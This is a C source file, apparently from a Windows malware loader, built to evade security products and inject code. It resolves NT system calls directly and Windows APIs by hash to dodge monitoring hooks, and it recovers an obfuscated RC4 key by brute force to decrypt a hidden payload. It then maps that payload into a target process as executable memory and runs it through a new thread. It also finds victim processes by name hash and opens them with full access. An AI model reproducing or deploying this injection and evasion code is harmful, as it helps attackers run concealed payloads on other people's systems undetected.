#include <Windows.h>
#include <stdio.h>
#include "Common.h"
#include "Debug.h"

UCHAR ProtectedKey[] = { 0x13, 0x18, 0x14, 0x8D, 0x83, 0xD0, 0xC6, 0x06, 0x43, 0x9C, 0x6B, 0x5D, 0x01, 0x3D, 0x09, 0xFD };

// global `VX_TABLE` structure
VX_TABLE 	g_Sys = { 0 };
API_HASHING g_Api = { 0 };

BOOL InitializeSyscalls() {

	// Get the PEB
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;

	// Get NTDLL module
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	g_Sys.NtCreateSection.uHash = NtCreateSection_JOAA;
	g_Sys.NtMapViewOfSection.uHash = NtMapViewOfSection_JOAA;
	g_Sys.NtUnmapViewOfSection.uHash = NtUnmapViewOfSection_JOAA;
	g_Sys.NtClose.uHash = NtClose_JOAA;
	g_Sys.NtCreateThreadEx.uHash = NtCreateThreadEx_JOAA;
	g_Sys.NtWaitForSingleObject.uHash = NtWaitForSingleObject_JOAA;
	g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
	g_Sys.NtDelayExecution.uHash = NtDelayExecution_JOAA;

	// Initialize the syscalls
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtMapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtUnmapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtClose))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateThreadEx))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtWaitForSingleObject))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtQuerySystemInformation))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtDelayExecution))
		return FALSE;

	//	User32.dll exported
	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), CallNextHookEx_JOAA);
	g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), DefWindowProcW_JOAA);
	g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), GetMessageW_JOAA);
	g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), SetWindowsHookExW_JOAA);
	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), UnhookWindowsHookEx_JOAA);

	if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || g_Api.pUnhookWindowsHookEx == NULL)
		return FALSE;

	// 	Kernel32.dll exported
	g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
	g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
	g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
	g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
	g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), SetFileInformationByHandle_JOAA);

	if (g_Api.pGetModuleFileNameW == NULL || g_Api.pCreateFileW == NULL || g_Api.pGetTickCount64 == NULL || g_Api.pOpenProcess == NULL || g_Api.pSetFileInformationByHandle == NULL)
		return FALSE;

	return TRUE;
}

BOOL Rc4EncryptionViSystemFunc032(PBYTE pRc4Key, PBYTE pPayloadData, DWORD dwRc4KeySize, DWORD sPayloadSize) {

	// The return of SystemFunction032
	NTSTATUS        	STATUS = NULL;
	BYTE			RealKey[KEY_SIZE] = { 0 };
	int			    b = 0;

	// Brute forcing the key:
	while (1) {
		// Using the hint byte, if this is equal, then we found the 'b' value needed to decrypt the key
		if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
			break;
		// Else, increment 'b' and try again
		else
			b++;
	}

#ifdef DEBUG
	PRINTA("[i] Calculated 'b' to be : 0x%0.2X \n", b);
#endif

	// Decrypting the key
	for (int i = 0; i < KEY_SIZE; i++) {
		RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);
	}

	// Making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
	USTRING         Key = { .Buffer = RealKey,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
		Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };

	// Since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the process,
	// And using its return as the hModule parameter in GetProcAddress
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryH("Cryptsp"), SystemFunction032_JOAA);

	// If SystemFunction032 calls failed it will return non zero value
	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
#ifdef DEBUG
		PRINTA("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
#endif
		return FALSE;
	}

	return TRUE;
}

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal) {

	HANDLE          hSection = NULL;
	HANDLE          hThread = NULL;
	PVOID           pLocalAddress = NULL,
		pRemoteAddress = NULL,
		pExecAddress = NULL;
	NTSTATUS        STATUS = NULL;
	SIZE_T          sViewSize = NULL;
	LARGE_INTEGER   MaximumSize = {
		  .HighPart = 0,
		  .LowPart = sPayloadSize
	};

	DWORD           dwLocalFlag = PAGE_READWRITE;

	//--------------------------------------------------------------------------
	// Allocating local map view
	ConfS(g_Sys.NtCreateSection.wSysC);
	if ((STATUS = RunSys(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	if (bLocal) {
		dwLocalFlag = PAGE_EXECUTE_READWRITE;
	}

	ConfS(g_Sys.NtMapViewOfSection.wSysC);
	if ((STATUS = RunSys(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, 1, NULL, dwLocalFlag)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

#ifdef DEBUG
	PRINTA("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pLocalAddress, sViewSize);
#endif

	//--------------------------------------------------------------------------
	// Writing the payload
	Rc4EncryptionViSystemFunc032(ProtectedKey, pPayload, KEY_SIZE, sPayloadSize);
	_memcpy(pLocalAddress, pPayload, sPayloadSize);
#ifdef DEBUG
	PRINTA("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pLocalAddress);
#endif

	//--------------------------------------------------------------------------
		// Allocating remote map view
	if (!bLocal) {

		ConfS(g_Sys.NtMapViewOfSection.wSysC);
		if ((STATUS = RunSys(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, 1, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
#ifdef DEBUG
			PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", STATUS);
#endif
			return FALSE;
		}

#ifdef DEBUG
		PRINTA("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pRemoteAddress, sViewSize);
#endif

	}

	//--------------------------------------------------------------------------
	// Executing the payload via thread creation
	pExecAddress = pRemoteAddress;
	if (bLocal) {
		pExecAddress = pLocalAddress;
	}
#ifdef DEBUG
	PRINTA("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
#endif
	ConfS(g_Sys.NtCreateThreadEx.wSysC);
	if ((STATUS = RunSys(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pExecAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] DONE \n");
	PRINTA("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));
#endif
	//--------------------------------------------------------------------------
	// Waiting for the thread to finish
	ConfS(g_Sys.NtWaitForSingleObject.wSysC);
	if ((STATUS = RunSys(hThread, FALSE, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	// Unmapping the local view
	ConfS(g_Sys.NtUnmapViewOfSection.wSysC);
	if ((STATUS = RunSys((HANDLE)-1, pLocalAddress)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	// Closing the section handle
	ConfS(g_Sys.NtClose.wSysC);
	if ((STATUS = RunSys(hSection)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	return TRUE;
}

BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {

	ULONG					    uReturnLen1 = NULL,
		uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION  SystemProcInfo = NULL;
	PVOID					    pValueToFree = NULL;
	NTSTATUS				    STATUS = NULL;

	// This will fail with status = STATUS_INFO_LENGTH_MISMATCH, but that's ok, because we need to know how much to allocate (uReturnLen1)
	ConfS(g_Sys.NtQuerySystemInformation.wSysC);
	RunSys(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {
		return FALSE;
	}

	// Since we will modify 'SystemProcInfo', we will save its intial value before the while loop to free it later
	pValueToFree = SystemProcInfo;

	// Calling NtQuerySystemInformation with the right arguments, the output will be saved to 'SystemProcInfo'
	ConfS(g_Sys.NtQuerySystemInformation.wSysC);
	STATUS = RunSys(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
#ifdef DEBUG
		PRINTA("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	while (TRUE) {

		// Small check for the process's name size
		// Comparing the enumerated process name to what we want to target
		if (SystemProcInfo->ImageName.Length && HASHW(SystemProcInfo->ImageName.Buffer) == HASHW(szProcName)) {
			// Opening a handle to the target process and saving it, then breaking
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			break;
		}

		// If NextEntryOffset is 0, we reached the end of the array
		if (!SystemProcInfo->NextEntryOffset)
			break;

		// Moving to the next element in the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	// Freeing using the initial address
	HeapFree(GetProcessHeap(), 0, pValueToFree);

	// Checking if we got the target's process handle
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}